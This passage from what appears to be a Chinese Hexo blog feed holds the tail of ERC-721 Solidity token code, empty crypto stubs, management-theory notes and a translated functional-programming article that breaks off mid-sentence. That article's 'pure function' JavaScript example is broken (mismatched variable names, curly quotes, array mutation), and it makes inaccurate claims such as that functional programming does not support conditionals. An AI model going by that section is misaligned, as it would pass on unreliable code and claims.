class="title function_">ownerOf</span>(tokenId);</span><br><span class="line">    <span class="comment">// Disable solium check because of</span></span><br><span class="line">    <span class="comment">// https://github.com/duaraghav8/Solium/issues/175</span></span><br><span class="line">    <span class="comment">// solium-disable-next-line operator-whitespace</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      spender == owner ||</span><br><span class="line">      <span class="title function_">getApproved</span>(tokenId) == spender ||</span><br><span class="line">      <span class="title function_">isApprovedForAll</span>(owner, spender)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function to mint a new token</span></span><br><span class="line"><span class="comment">   * Reverts if the given token ID already exists</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to The address that will own the minted token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be minted by the msg.sender</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_mint</span>(<span class="params">address to, uint256 tokenId</span>) internal &#123;</span><br><span class="line">    <span class="built_in">require</span>(to != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="title function_">_addTokenTo</span>(to, tokenId);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), to, tokenId);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function to burn a specific token</span></span><br><span class="line"><span class="comment">   * Reverts if the token does not exist</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token being burned by the msg.sender</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_burn</span>(<span class="params">address owner, uint256 tokenId</span>) internal &#123;</span><br><span class="line">    <span class="title function_">_clearApproval</span>(owner, tokenId);</span><br><span class="line">    <span class="title function_">_removeTokenFrom</span>(owner, tokenId);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(owner, <span class="title function_">address</span>(<span class="number">0</span>), tokenId);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function to clear current approval of a given token ID</span></span><br><span class="line"><span class="comment">   * Reverts if the given address is not indeed the owner of the token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> owner owner of the token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be transferred</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_clearApproval</span>(<span class="params">address owner, uint256 tokenId</span>) internal &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">ownerOf</span>(tokenId) == owner);</span><br><span class="line">    <span class="keyword">if</span> (_tokenApprovals[tokenId] != <span class="title function_">address</span>(<span class="number">0</span>)) &#123;</span><br><span class="line">      _tokenApprovals[tokenId] = <span class="title function_">address</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function to add a token ID to the list of a given address</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to address representing the new owner of the given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be added to the tokens list of the given address</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_addTokenTo</span>(<span class="params">address to, uint256 tokenId</span>) internal &#123;</span><br><span class="line">    <span class="built_in">require</span>(_tokenOwner[tokenId] == <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line">    _tokenOwner[tokenId] = to;</span><br><span class="line">    _ownedTokensCount[to] = _ownedTokensCount[to].<span class="title function_">add</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function to remove a token ID from the list of a given address</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> from address representing the previous owner of the given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be removed from the tokens list of the given address</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_removeTokenFrom</span>(<span class="params">address <span class="keyword">from</span>, uint256 tokenId</span>) internal &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">ownerOf</span>(tokenId) == <span class="keyword">from</span>);</span><br><span class="line">    _ownedTokensCount[<span class="keyword">from</span>] = _ownedTokensCount[<span class="keyword">from</span>].<span class="title function_">sub</span>(<span class="number">1</span>);</span><br><span class="line">    _tokenOwner[tokenId] = <span class="title function_">address</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function to invoke `onERC721Received` on a target address</span></span><br><span class="line"><span class="comment">   * The call is not executed if the target address is not a contract</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> from address representing the previous owner of the given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to target address that will receive the tokens</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be transferred</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> _data bytes optional data to send along with the call</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> whether the call correctly returned the expected magic value</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_checkAndCallSafeTransfer</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 tokenId,</span></span><br><span class="line"><span class="params">    bytes _data</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    internal</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!to.<span class="title function_">isContract</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bytes4 retval = <span class="title class_">IERC721Receiver</span>(to).<span class="title function_">onERC721Received</span>(</span><br><span class="line">      msg.<span class="property">sender</span>, <span class="keyword">from</span>, tokenId, _data);</span><br><span class="line">    <span class="keyword">return</span> (retval == _ERC721_RECEIVED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://eips.ethereum.org/EIPS/eip-721">https://eips.ethereum.org/EIPS/eip-721</a></li><li><a href="https://wizard.openzeppelin.com/#erc721">https://wizard.openzeppelin.com/#erc721</a></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts">https://github.com/OpenZeppelin/openzeppelin-contracts</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ERC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elliptic Curve</title>
      <link href="/2023/04/18/crypto/Elliptic%20Curve/"/>
      <url>/2023/04/18/crypto/Elliptic%20Curve/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethereum</title>
      <link href="/2023/04/18/crypto/Ethereum/"/>
      <url>/2023/04/18/crypto/Ethereum/</url>
      
        <content type="html"><![CDATA[<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://ethereum.org/">https://ethereum.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethereum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HKDF</title>
      <link href="/2023/04/18/crypto/HKDF/"/>
      <url>/2023/04/18/crypto/HKDF/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HKDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPFS - InterPlanetary File System</title>
      <link href="/2023/04/18/crypto/IPFS%20-%20InterPlanetary%20File%20System/"/>
      <url>/2023/04/18/crypto/IPFS%20-%20InterPlanetary%20File%20System/</url>
      
        <content type="html"><![CDATA[<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://ipfs.tech/">https://ipfs.tech/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ERC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Merkle Tree</title>
      <link href="/2023/04/18/crypto/Merkle%20Tree/"/>
      <url>/2023/04/18/crypto/Merkle%20Tree/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/images/Hash_Tree.svg.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://en.wikipedia.org/wiki/Merkle_tree">https://en.wikipedia.org/wiki/Merkle_tree</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Merkle Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2023/04/18/crypto/RSA/"/>
      <url>/2023/04/18/crypto/RSA/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>混沌课程图谱</title>
      <link href="/2023/04/17/%E6%B7%B7%E6%B2%8C%E8%AF%BE%E7%A8%8B%E5%9B%BE%E8%B0%B1/"/>
      <url>/2023/04/17/%E6%B7%B7%E6%B2%8C%E8%AF%BE%E7%A8%8B%E5%9B%BE%E8%B0%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="第一性原理"><a href="#第一性原理" class="headerlink" title="第一性原理"></a>第一性原理</h2><h3 id="本质出发解决问题"><a href="#本质出发解决问题" class="headerlink" title="本质出发解决问题"></a>本质出发解决问题</h3><ul><li>第一性原理<ul><li>根基性命题, 元起点</li></ul></li><li>公理思维<ul><li>本质出发构建创新系统</li></ul></li><li>破界创新<ul><li>破旧认知发现新世界</li></ul></li><li>组织刷新<ul><li>刷新使命驱动战略</li></ul></li><li>第一创新<ul><li>第一原理引领创新</li></ul></li><li>批判思维<ul><li>发现真相</li></ul></li><li>万物至理<ul><li>超越对立走向整合</li></ul></li><li>从众效应<ul><li>打破群体信念</li></ul></li></ul><h2 id="第二曲线"><a href="#第二曲线" class="headerlink" title="第二曲线"></a>第二曲线</h2><h3 id="创新驱动增长引擎"><a href="#创新驱动增长引擎" class="headerlink" title="创新驱动增长引擎"></a>创新驱动增长引擎</h3><ul><li>战略杠杆<ul><li>系统思考构建长期战略</li></ul></li><li>组合创新<ul><li>旧要素发现新机会</li></ul></li><li>单点破局<ul><li>力出一孔十倍速增长</li></ul></li><li>错位竞争<ul><li>与其更好不如不同</li></ul></li><li>低端颠覆<ul><li>新生力量逆袭</li></ul></li><li>组织心智<ul><li>冲破内部阻碍</li></ul></li><li>第二曲线<ul><li>重启增长创新</li></ul></li><li>分形创新<ul><li>老产品长出新生命</li></ul></li></ul><h2 id="理念世界"><a href="#理念世界" class="headerlink" title="理念世界"></a>理念世界</h2><h3 id="寻源-连接-创造"><a href="#寻源-连接-创造" class="headerlink" title="寻源-连接-创造"></a>寻源-连接-创造</h3><ul><li>觉醒意识<ul><li>我与理念世界的关系</li></ul></li><li>理念世界<ul><li>探寻本源，人生意义</li></ul></li><li>临在当下<ul><li>连接源头</li></ul></li><li>寂静之美<ul><li>寂静和留白滋养心灵</li></ul></li><li>灵感流淌<ul><li>临在当下最小切口</li></ul></li><li>美好作品<ul><li>事情做到极致</li></ul></li><li>一生悬命<ul><li>一生只做一件事</li></ul></li><li>使命召唤<ul><li>君子知命而信之</li></ul></li></ul><h2 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h2><p>这里推荐一些我看过的书籍，这些书籍将有利于构建这样的知识图谱。</p><ul><li>《第一性原理》</li><li>《第二曲线》</li><li>《经济发展理论》</li><li>《无边界组织》</li><li>《卓有成效的管理者》</li><li>《第五项修炼·心灵篇》</li><li>《第五项修炼·学习型组织的艺术与实践》</li><li>《毛泽东选集》1 - 4 册</li><li>《苏格拉底的申辩》</li><li>《周易》</li><li>《道德经》</li><li>《大学》</li><li>《中庸》</li><li>《孙子兵法》</li><li>《金刚经》</li><li>《心经》</li><li>《楞严经》</li><li>《法华经》</li><li>《坛经》</li><li>《组织的力量》</li><li>《心法》《活法》《干法》</li></ul><h2 id="混沌体系课程"><a href="#混沌体系课程" class="headerlink" title="混沌体系课程"></a>混沌体系课程</h2><p><img src="/assets/images/%E6%B7%B7%E6%B2%8C%E6%A0%B8%E5%BF%83-1.jpg"><br><img src="/assets/images/%E6%B7%B7%E6%B2%8C%E6%A0%B8%E5%BF%83-3.jpg"><br><img src="/assets/images/%E6%B7%B7%E6%B2%8C%E6%A0%B8%E5%BF%83-4.jpg"><br><img src="/assets/images/%E6%B7%B7%E6%B2%8C%E6%A0%B8%E5%BF%83-5.jpg"><br><img src="/assets/images/%E6%B7%B7%E6%B2%8C%E6%A0%B8%E5%BF%83-6.jpg"><br><img src="/assets/images/%E6%B7%B7%E6%B2%8C%E6%A0%B8%E5%BF%83-7.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识图谱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无边界组织</title>
      <link href="/2023/04/08/%E6%97%A0%E8%BE%B9%E7%95%8C%E7%BB%84%E7%BB%87/"/>
      <url>/2023/04/08/%E6%97%A0%E8%BE%B9%E7%95%8C%E7%BB%84%E7%BB%87/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>无边界组织是指其横向的、纵向的或外部的边界不由某种预先设定的结构所限定或定义的这样一种组织设计。在今天的环境中要最有效地运营，就必须保持灵活性和非结构化。无边界组织力图取缔指挥链，保持合适的管理跨度，以授权的团队取代部门。</p><h2 id="管理界思想"><a href="#管理界思想" class="headerlink" title="管理界思想"></a>管理界思想</h2><p>管理界认为，无边界组织(boundaryless organization)，也就是一种有机组织。有机组织被置于一个更大的有机组织之中，就像动物细胞核与细胞体、动物细胞与动物器官组织、动物器官组织与动物体之间的关系一样，彼此之间的关系不能僵死。如果这种关系僵化，将直接导致动物肌体组织的死亡和动物本身的死亡。</p><p>无边界组织是相对于有边界组织而言的。有边界组织要保留边界，完全是为了保证组织的稳定与秩序。但无边界组织也需要稳定和呈现度，所以它绝不是要完全否定企业组织必有的控制手段，包括工作分析、岗位定级、职责权力等等的设定，只是不能把它们僵死化。</p><p>所谓无边界组织是指边界不由某种预先设定的结构所限定或定义的组织结构。边界通常有横向、纵向和外部边界三种。横向边界是由工作专门化和部门化形成的，纵向边界是由组织层级所产生的，外部边界是组织与其顾客、供应商等之间形成的隔墙。</p><h2 id="韦尔奇思想"><a href="#韦尔奇思想" class="headerlink" title="韦尔奇思想"></a>韦尔奇思想</h2><p>在传统的意义上，企业靠严格的边界制胜，未来的企业则要靠无边界赢得竞争。传统的企业组织结构里面一般包括四种边界：<code>垂直边界</code>、<code>水平边界</code>、<code>外部边界</code>、<code>地理边界</code>。</p><blockquote><p>垂直边界是指企业内部的层次和职业等级；<br>水平边界是分割职能部门及规则的围墙；<br>外部边界是企业与顾客、供应商、管制机构之间的隔离；<br>地理边界是区分文化、国家市场的界限。</p></blockquote><p>在传统的企业管理模式下，企业按照需要把员工和业务流程进行划分，使得各个要素各负其责，各尽其职。传统的企业组织机构是一种自上而下的金字塔式的管理模式，管理机构恪守各自严格的边界，企业有着严格的组织和等级界限。而这往往造成组织规模庞大、等级过多、职权过于集中、组织效率低下、应变迟缓乏力、内部沟通阻隔，阻碍创新和抑制员工的主动性。为适应经济全球化、信息网络技术和知识经济的挑战与冲击，企业的管理模式不能恪守依据职权划分和层级管理来机械设置管理层次和职能部门的传统模式，而应充分体现组织对环境的适应性和应变力，使之能够在第一时间对环境变革做出快速反应，同时也允许设计过程具有高度的灵活性和可变性。</p><p>无边界原理受生物学的启发，认为企业组织就像生物有机体一样，存在各种隔膜使之具有外形或界定。虽然生物体的这些隔膜有足够的结构和强度，但是并不妨碍食物、血液、氧气、化学物质畅通无阻地穿过。无边界组织的原理认为，信息、资源、构想、能量也应该能够快捷顺利地穿越企业的边界，使整个企业真正溶为一体。在无边界原理中，企业各部分的职能和边界仍旧存在，仍旧有位高权重的领导，有特殊职能技术的员工，有承上启下的中层管理者，使各个边界能够自由沟通、交流，实现最佳的合作。在无边界原理下需要重新分析企业原有的边界。</p><h3 id="垂直边界"><a href="#垂直边界" class="headerlink" title="垂直边界"></a>垂直边界</h3><p>旧的垂直边界主要是传统的金字塔式组织结构引起的内部等级制度，组织按各自的职权划分为层层的机构，各个机构都界定了不同的职责、职位和职权。无边界模式则突破了僵化的定位，从某种程度上撇开权威与地位，职位让位于能力，大家群策群力，往往采用一种团队模式，只要是有利于企业发展的建议都会受到重视和采纳。在无边界模式下各个层级之间是互相渗透的，能够最大限度地发挥各自的能力。</p><h3 id="水平边界"><a href="#水平边界" class="headerlink" title="水平边界"></a>水平边界</h3><p>旧的水平边界企业按各个组成部分的职能不同而划分为不同的职能部门，由于各职能部门都依据自身的特点行事，往往与其它部门发生矛盾和冲突。无边界模式就是要突破各个职能部门之间的边界，真正使计划、生产、销售等各部门真正连为一体，形成统一的系统。</p><h3 id="外部边界"><a href="#外部边界" class="headerlink" title="外部边界"></a>外部边界</h3><p>外部边界是企业与供应商、顾客、政府管制机构、社区等外部环境的分水岭。这些边界在传统企业中泾渭分明，使大多数企业与外部环境之间形成一种内外有别的关系，于是讨价还价施加压力，隐瞒信息就成了做生意必不可少的手段。一个无边界公司则把外部的围墙推倒，让供应商和顾客成为一个系统的组成部分，真正做到为顾客服务，这样可以形成融洽和谐的外部环境和良好的公共关系。</p><h3 id="地理边界"><a href="#地理边界" class="headerlink" title="地理边界"></a>地理边界</h3><p>地理边界或称国际边界，它是区分文化、国家、市场的界限。边界的存在往往使得新方法新思想局限于某国之一角而难以传播，整个公司不能充分学习他人之经验，不利于企业的成功。伴随着经济全球化的到来，企业的地理边界慢慢被打破，不同国家的企业相互学习，跨国公司慢慢的与当地的文化相融合。无边界就是要打破各个边界之间的障碍，使信息和资源能够得到最佳配置，使企业系统能够达到最佳状态。无边界管理本质上也是一种人本管理的模式，它把员工从严格的等级制度下解放出来，真正尊重员工的价值，使他们能够最大限度地发挥自己的才智。</p><h2 id="走向“无边界组织”的三个组织变化趋势"><a href="#走向“无边界组织”的三个组织变化趋势" class="headerlink" title="走向“无边界组织”的三个组织变化趋势"></a>走向“无边界组织”的三个组织变化趋势</h2><p>面对无限多元、个性、极致、迭代快速的用户需求，诸多企业已经开始寻找组织转型之路。穆胜博士认为新组织模式的变化可以用三个方面来描述，而这三个趋势也将企业推向了更加极端的“无边界组织”。</p><h3 id="用户中心主义"><a href="#用户中心主义" class="headerlink" title="用户中心主义"></a>用户中心主义</h3><p>即生产需求由用户发起。互联网时代，用户需求长尾分布、无限多元，需要用更加灵活的资源组织形式去匹配用户需求，用户需求应该是发起生产的起点。</p><h3 id="企业“平台化”"><a href="#企业“平台化”" class="headerlink" title="企业“平台化”"></a>企业“平台化”</h3><p>即去行政权威，让位于业务单元和个人的主观能动性。企业的管理者更多地把自己定位于初始资源的分配者、规则的制定者、秩序的维护者，不再以行政命令的方式来调配资源。</p><h3 id="员工“创客化”"><a href="#员工“创客化”" class="headerlink" title="员工“创客化”"></a>员工“创客化”</h3><p>即去行政服从，发挥个体的积极性。让员工成为创客，成为市场中一个独立决策的经济个体（经营体）。他们不仅对成本负责，还对收入负责。不仅对企业支付给自己的人工成本负责，还为自己占有企业内资源产生的成本负责。</p><h2 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h2><ul><li>《无边界组织》杰克·韦尔奇</li><li><a href="https://baike.baidu.com/item/%E6%97%A0%E8%BE%B9%E7%95%8C%E7%BB%84%E7%BB%87/3720575">无边界组织</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Human Resource Management </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图谱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>灵感集 · Inspiration Set</title>
      <link href="/2023/04/08/%E7%81%B5%E6%84%9F%E9%9B%86%20%C2%B7%20Inspiration%20Set/"/>
      <url>/2023/04/08/%E7%81%B5%E6%84%9F%E9%9B%86%20%C2%B7%20Inspiration%20Set/</url>
      
        <content type="html"><![CDATA[<h2 id="2023-04-08-函数式编程-Serverless-Low-Code"><a href="#2023-04-08-函数式编程-Serverless-Low-Code" class="headerlink" title="2023-04-08 函数式编程 + Serverless + Low Code"></a>2023-04-08 函数式编程 + Serverless + Low Code</h2><p>利用函数式编程的思想就好像是在一张画布坐标上行走，每一次进步（映射）都在朝着终点前行。目标的拆解变成了每一次执行纯函数的效果。它如此地简洁又易于理解甚至可以做到产品里。<code>Serverless</code> + <code>Low Code</code> 是 函数式编程最好的实践。</p><p>一个具体的例子是，在低代码平台中使用函数式编程思想来实现自定义逻辑。例如，一个低代码平台的用户需要实现一个根据输入数据计算出结果的逻辑，可以使用函数式编程的思想来实现。具体来说，可以使用函数作为参数或返回值，通过组合不同的函数来实现复杂的逻辑。</p><p>例如，可以使用高阶函数来实现数据的过滤、映射和聚合等操作，或者使用函数组合来实现复杂的计算逻辑。这种方式可以帮助低代码平台实现更加灵活和可扩展的自定义逻辑，同时降低代码的复杂度和维护成本。另外，一些低代码平台也提供了函数式编程的支持，例如通过 Lambda 表达式来实现自定义逻辑。</p><h2 id="2023-04-10-一些有意思名字的来源"><a href="#2023-04-10-一些有意思名字的来源" class="headerlink" title="2023-04-10 一些有意思名字的来源"></a>2023-04-10 一些有意思名字的来源</h2><p>可以从那种给人宁静感的视频里，最好能有丰富的聊天对话。从对话中可以取名字，比如：一谷、寒山、夜话、塔影…</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 灵感语录集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是函数式编程以及为什么要使用它？</title>
      <link href="/2023/04/07/%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%BB%A5%E5%8F%8A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8%E5%AE%83/"/>
      <url>/2023/04/07/%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%BB%A5%E5%8F%8A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8%E5%AE%83/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是函数式编程？"><a href="#什么是函数式编程？" class="headerlink" title="什么是函数式编程？"></a>什么是函数式编程？</h2><p>函数式编程 (FP) 是一种软件开发方法，它使用纯函数来创建可维护的软件。换句话说，通过应用和组合函数来构建程序。</p><p>函数式编程通过将函数用作变量、参数和返回值来利用语言支持——在此过程中创建优雅和干净的代码。FP 还使用不可变数据并避免共享状态等概念。这与使用可变数据和共享状态的面向对象编程 (OOP) 形成对比。</p><p>函数式编程语言专注于声明和表达式，而不是语句的执行。函数也被视为一等公民——这意味着它们可以作为参数传递、从其他函数返回并附加到名称上。</p><p>FP 关注结果，而不是过程，同时不支持循环语句和条件语句（例如，If-Else）等迭代。</p><p>FP 从 lambda 演算 ( λ -calculus)演变而来，它是数学家 Alonzo Church 在 1930 年代开发的一种简单的函数和应用符号。许多编程语言和方言都使用函数范式，包括 Scheme、Common Lisp (CL) 和 Elixir。</p><p>许多当今的顶级编程语言——包括 C#、Java、JavaScript、PHP 和 Python——都支持函数式编程或使用 FP 中的功能。</p><h3 id="纯函数式编程"><a href="#纯函数式编程" class="headerlink" title="纯函数式编程"></a>纯函数式编程</h3><p>纯函数式编程是 FP 的一个子集，它将所有函数都视为确定性数学函数或纯函数。</p><p>在确定性数学函数中，系统未来状态的发展不允许任何随机性。与此同时，纯函数对于相同的参数具有相同的函数返回值。函数应用程序也没有副作用（即，它不会修改其本地环境之外的状态变量值）。</p><p>当您将外部代码插入您的函数时，程序中会出现副作用。这会阻止函数正确执行其任务。相反，不纯函数包含一种或多种副作用。</p><p>要查看纯函数的运行情况，请参阅以下 JavaScript 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">updateMyAddress</span>(<span class="params">newAddress</span>) &#123;</span><br><span class="line">   <span class="keyword">const</span> myAddress = [“<span class="title class_">ChurchSt</span>”, “<span class="title class_">CovingtonCross</span>”];</span><br><span class="line">   myAddresses[myAddresses.<span class="property">length</span>] = newAddress;</span><br><span class="line">   <span class="keyword">return</span> myAddresses;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>updateMyAddress() 不需要任何外部代码即可完成其任务。这意味着它是一个纯函数。</p><h3 id="不纯函数式编程"><a href="#不纯函数式编程" class="headerlink" title="不纯函数式编程"></a>不纯函数式编程</h3><p>要查看不纯函数的运行情况，请查看这段 JavaScript 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​​<span class="keyword">const</span> myAddresses = [“<span class="title class_">ChurchSt</span>.”, “<span class="title class_">CovingtonCross</span>”];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateMyAddress</span>(<span class="params">newAddress</span>) &#123;</span><br><span class="line">  myAddresses.<span class="title function_">push</span>(newAddress);</span><br><span class="line">  <span class="keyword">return</span> myAddresses;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>updateMyAddress() 是一个不纯的函数，因为它包含代码 (myAddress)。这段代码改变了一个外部状态，这给 updateMyAddress() 带来了一些副作用。</p><h2 id="为什么函数式编程很重要"><a href="#为什么函数式编程很重要" class="headerlink" title="为什么函数式编程很重要"></a>为什么函数式编程很重要</h2><p>虽然 FP 通常不如面向对象编程受欢迎，但近年来由于机器学习和大数据的兴起，它越来越受欢迎。函数式编程以其高效并行化纯函数的能力而著称。使用函数式编程范例，数据分析工作流和任务的代码更易于分析、测试和维护。</p><p>由于其纯粹的性质，FP 非常适合分析大量数据集和机器学习。纯函数将始终产生相同的结果，没有外部值影响最终结果。</p><p>使用 FP 创建的算法也可以快速识别和纠正错误。许多程序员和软件开发人员宁愿使用一种易于调试的编程范式，因为它具有纯功能。</p><p>正如格拉斯哥大学的 John Hughes 发表的一篇论文中强调的那样，函数式编程因其模块化而在未来的技术发展中发挥着至关重要的作用。模块化将大型复杂项目分解为更简单的模块。您可以单独测试模块，从而减少单元测试和调试所花费的时间。</p><p>“函数式编程语言提供了两种新的粘合剂——高阶函数和惰性求值。使用这些胶水，人们可以以新的和有用的方式模块化程序，”休斯在他的论文中指出。</p><h3 id="函数式编程的优点"><a href="#函数式编程的优点" class="headerlink" title="函数式编程的优点"></a>函数式编程的优点</h3><table><thead><tr><th>函数式编程</th><th>面向对象</th></tr></thead><tbody><tr><td>使用不可变数据。</td><td>使用可变数据。</td></tr><tr><td>遵循声明式编程模型。</td><td>遵循命令式编程模型。</td></tr><tr><td>重点是：“你在做什么”</td><td>重点是“你做得怎么样”</td></tr><tr><td>支持并行编程</td><td>不适合并行编程</td></tr><tr><td>其功能无副作用</td><td>它的方法会产生严重的副作用。</td></tr><tr><td>流量控制是使用函数调用和递归函数调用完成的</td><td>流量控制是使用循环和条件语句完成的。</td></tr><tr><td>它使用“递归”概念来迭代集合数据。</td><td>它使用“循环”概念来迭代集合数据。例如：Java 中的 For-each 循环</td></tr><tr><td>语句的执行顺序并不那么重要。</td><td>语句的执行顺序非常重要。</td></tr><tr><td>支持“对数据的抽象”和“对行为的抽象”。</td><td>仅支持“数据抽象”。</td></tr></tbody></table><h2 id="7-个核心函数式编程概念"><a href="#7-个核心函数式编程概念" class="headerlink" title="7 个核心函数式编程概念"></a>7 个核心函数式编程概念</h2><p>为了帮助您更好地理解函数式编程可以解决的问题，让我们看一下函数式编程的七个核心概念。</p><h3 id="纯函数"><a href="#纯函数" class="headerlink" title="纯函数"></a>纯函数</h3><p>我们已经确定纯函数是确定性的并且没有副作用。然而，正如 Victor Cordova 在 Hackernoon 